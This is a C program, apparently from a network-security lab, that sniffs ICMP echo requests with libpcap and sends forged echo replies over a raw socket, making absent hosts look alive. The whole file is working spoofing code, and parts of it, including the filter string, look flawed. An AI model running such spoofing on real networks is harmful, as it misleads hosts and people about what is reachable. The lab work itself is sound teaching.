#include <unistd.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "header.h"

unsigned short in_cksum (unsigned short *buf, int length);

void send_raw_ip_packet(struct ipheader* ip) {
    struct sockaddr_in dest_info;
    int enable = 1;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;
    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,
                              const u_char *packet)
{
  struct ethheader *eth = (struct ethheader *)packet;

  if (ntohs(eth->ether_type) == 0x0800) { // 0x0800 is IP type
    struct ipheader * ip = (struct ipheader *)
                           (packet + sizeof(struct ethheader)); 
  

    /* determine protocol */
    switch(ip->iph_protocol) {                                 
        case IPPROTO_ICMP:
        ; // to get rid of 'a label can only be part of a statement' error
        int ip_len = ip->iph_ihl * 4;
        struct icmpheader *icmp = (struct icmpheader*)(packet + sizeof(struct ethheader) + ip_len);
        if (icmp->icmp_type == 8){ // echo request
            printf("================\n");
            printf("   Got an ICMP Echo Request\n");
            printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));   
            printf("         To: %s\n", inet_ntoa(ip->iph_destip));
            printf("   Spoofing Echo Reply\n");  
            icmp->icmp_type = 0; // changing the type to echo reply
            // fliping destination and source addresses
            struct in_addr flip_source = ip->iph_sourceip; 
            struct in_addr flip_destination = ip->iph_destip;
            ip->iph_sourceip = flip_destination;
            ip->iph_destip = flip_source;
            // spoofing
            send_raw_ip_packet(ip);
        }
            return;
        default:
            printf("   Protocol: others\n");
            return;
    }
  }
}

void main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter_exp[] = "icmp[icmptype = 8]"; // if it is echo request
  bpf_u_int32 net;

  // Step 1: Open live pcap session on NIC with name enp0s3
  handle = pcap_open_live("br-82d5b13c1347", BUFSIZ, 1, 1000, errbuf);

  // Step 2: Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net);
  pcap_setfilter(handle, &fp);

  // Step 3: Capture packets
  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle);   //Close the handle
}
